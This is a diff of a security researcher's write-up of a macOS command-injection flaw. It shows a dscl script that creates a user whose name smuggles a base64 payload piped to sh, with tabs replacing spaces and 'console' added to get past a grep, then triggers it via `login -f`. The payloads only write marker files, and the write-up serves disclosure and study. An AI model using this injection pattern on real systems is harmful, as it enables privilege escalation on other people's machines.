@@ -151,24 +151,35 @@ I've added the exploit [here](utmpwn.py).
 Apparently, Claude was lying and it's quite easy to create weird user:
 
 ```shell
-#!/bin/zsh
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console'
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' UserShell /bin/zsh
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' RealName "UTM PWN"
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' UniqueID 1337
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' PrimaryGroupID 20
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' NFSHomeDirectory /Users/Leet
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' password123
-mkdir /Users/Leet
-chown 'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' /Users/Leet
-login -f 'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console'
+#!/bin/bash
+dscl . -create /Users/'`echo	ZWNobyBoaSEgPiAvdG1wL3B3bi50eHQK|base64	-d|sh` console' UserShell /bin/zsh
+dscl . -create /Users/'`echo	ZWNobyBoaSEgPiAvdG1wL3B3bi50eHQK|base64	-d|sh` console' UserShell /bin/zsh
+dscl . -create /Users/'`echo	ZWNobyBoaSEgPiAvdG1wL3B3bi50eHQK|base64	-d|sh` console' RealName "UTM PWN"
+dscl . -create /Users/'`echo	ZWNobyBoaSEgPiAvdG1wL3B3bi50eHQK|base64	-d|sh` console' UniqueID 1337
+dscl . -create /Users/'`echo	ZWNobyBoaSEgPiAvdG1wL3B3bi50eHQK|base64	-d|sh` console' PrimaryGroupID 20
+dscl . -create /Users/'`echo	ZWNobyBoaSEgPiAvdG1wL3B3bi50eHQK|base64	-d|sh` console' NFSHomeDirectory /Users/Utmpwn
+dscl . -create /Users/'`echo	ZWNobyBoaSEgPiAvdG1wL3B3bi50eHQK|base64	-d|sh` console' password123
+mkdir /Users/Utmpwn
+chown '`echo	ZWNobyBoaSEgPiAvdG1wL3B3bi50eHQK|base64	-d|sh` console':staff /Users/Utmpwn
+login -f '`echo	ZWNobyBoaSEgPiAvdG1wL3B3bi50eHQK|base64	-d|sh` console'
 ```
 
 This simply works!  
-I also have done the experiment with an active directory server and LDAP, and was able to reproduce the same thing with LDAP.  
-This means this exploit might be "remotely triggerable" in *some* sense, but it's not really a remote code execution vulnerability.
-Note we have to avoid spaces and must include the word "console" for `who | grep "console" | cut -d " " -f 1` to succeed.
+Note how we:
+1. Use tabs (maybe it doesn't show nicely, but between `echo` and the pipe, and between `base64` and `-d` there are tabs - not spaces.
+2. Added `console` to the username to fool the script that does `grep "console"` without considering whether the username has "console" in it.
+3. Use `login -f` to log in as that user. The entry for `who` will not say it's a `console` user, but due to the weird username we have with "console" in it - it will still be processed.
 
+```
+jbo@JBOs-MacBook-Pro ~ % who
+jbo              ttys000      Mar 28 10:43
+echo	ZWNobyBoaSEgPiAvdG1wL3B3bi50eHQK|base64	-d|sh` console ttys001      Mar 28 12:16
+jbo              ttys002      Mar 28 10:44
+jbo              console      Mar 28 10:43
+jbo              ttys003      Mar 28 10:44
+```
+
+Interestingly, I was able to trigger a similar behavior from LDAP, which means this might be "remotely triggerable", albeit not a full RCE of course.
 
 ## Summary
 There are some interesting takeaways from this vulnerability:
